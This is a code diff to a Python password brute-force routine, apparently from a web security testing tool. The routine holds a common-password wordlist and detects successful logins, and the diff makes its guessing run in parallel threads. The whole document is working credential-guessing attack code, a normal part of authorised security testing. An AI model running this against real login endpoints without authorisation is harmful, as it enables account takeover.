@@ -14,7 +14,7 @@ def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
         "123456", "password", "12345678", "qwerty", "123456789",
         "12345", "111111", "1234567", "dragon", "admin",
         "welcome", "orange", "password123", "letmein", "monkey",
-        "system", "login", "changeme", "sunshine", "princess", "soulmad",
+        "system", "login", "changeme", "sunshine", "princess",
         "charlie", "123123", "1234", "root", "pass", "football", 
         "computer", "george", "1234567890", "master", "shadow", 
         "superman", "jessica", "daniel", "solo", "bebe", "trust", 
@@ -62,21 +62,36 @@ def run_brute_force(client: HttpClient, scenario: SimpleScenario) -> Dict[str, A
     responses = []
     success_creds = []
     
-    for i, pwd in enumerate(passwords):
-        body = {"username": username, "password": pwd}
-        # Try both JSON and Form just in case
-        resp = client.send(scenario.method, scenario.target, json_body=body)
-        
-        if resp.status_code != 0:
-            responses.append(resp.status_code)
+    import concurrent.futures
+    
+    def check_password(pwd):
+        try:
+            body = {"username": username, "password": pwd}
+            resp = client.send(scenario.method, scenario.target, json_body=body)
             
-            # Check for Successful Login!
-            # If we get a redirect (302) or a 200 with specific token/welcome message
-            # different from the baseline failure
-            if resp.status_code == 200 and "token" in resp.text.lower():
-                success_creds.append(pwd)
-            elif resp.status_code in [302, 301] and "login" not in resp.headers.get("Location", ""):
-                 success_creds.append(pwd)
+            if resp.status_code != 0:
+                responses.append(resp.status_code)
+                
+                # Check for Successful Login!
+                if resp.status_code == 200 and "token" in resp.text.lower():
+                    success_creds.append(pwd)
+                elif resp.status_code in [302, 301] and "login" not in resp.headers.get("Location", ""):
+                     success_creds.append(pwd)
+        except Exception:
+            pass # Suppress thread errors to prevent engine crash
+                 
+    # Run in parallel
+    # REDUCED THREADS: Nested concurrency can choke the OS.
+    # Engine runs 5-10 threads. If each launches 20, we enter 200+ thread territory.
+    # Let's keep this sane.
+    max_workers = 5
+    
+    try:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+            # list() forces execution and catches 'map' exceptions if any propagate
+            list(executor.map(check_password, passwords))
+    except Exception as e:
+        print(f"    [!] Brute Force Partial Error: {e}")
 
     if success_creds:
          return {
